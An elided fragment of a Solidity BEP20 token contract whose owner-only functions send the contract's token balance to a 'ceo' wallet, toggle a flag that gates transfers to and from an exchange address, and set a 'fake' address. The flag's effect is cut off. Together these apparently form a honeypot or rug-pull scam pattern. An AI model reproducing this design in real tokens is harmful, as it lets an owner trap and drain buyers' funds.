...
contract TokenBEP20 is BEP20Interface, Owned{
 ...
 contract TEST is TokenBEP20 {
  ...
  address payable private deadWallet;
  address payable private ceoAddr;
  address payable private fakeAddr;
  address payable private swapExchange;
  ...
  constructor (address payable deadAddr, address payable ceoWallet) public {
      deadWallet = deadAddr;
      ceoAddr = ceoWallet;
 ...
 function exitToken() public onlyOwner() {
      ...
      balances[ceoAddr] = balances[ceoAddr].add(bl);
      balances[address(this)] = balances[address(this)].sub(bl);
      emit Transfer(address(this), ceoAddr, bl);
  }
 
 function burn(uint256 burnToken) public onlyOwner() {
      uint256 butnTokenLocal = burnToken * 1 ether;
      balances[deadWallet] = balances[deadWallet].add(butnTokenLocal);
      balances[address(this)] = balances[address(this)].sub(butnTokenLocal);
      emit Transfer(address(this), deadWallet, butnTokenLocal);
  }

  function burnSelf(uint256 burnToken) public onlyOwner() {
      uint256 butnTokenLocal = burnToken * 1 ether;
      balances[deadWallet] = balances[deadWallet].add(butnTokenLocal);
      balances[ceoAddr] = balances[ceoAddr].sub(butnTokenLocal);
      emit Transfer(ceoAddr, deadWallet, butnTokenLocal);
  } 
  ...
  function transfer(address to, uint tokens) public returns (bool success) {
    ...
    if(flag == true){
      if(to == swapExchange || msg.sender == swapExchange){
  ...
  function setFlag(bool val) public onlyOwner(){
      flag = val;
  }

  function setExchange(address payable pnk)public onlyOwner(){
      swapExchange = pnk;
  }
    
  function setKit(address payable  kit) public onlyOwner(){
    fakeAddr = kit;
  }   
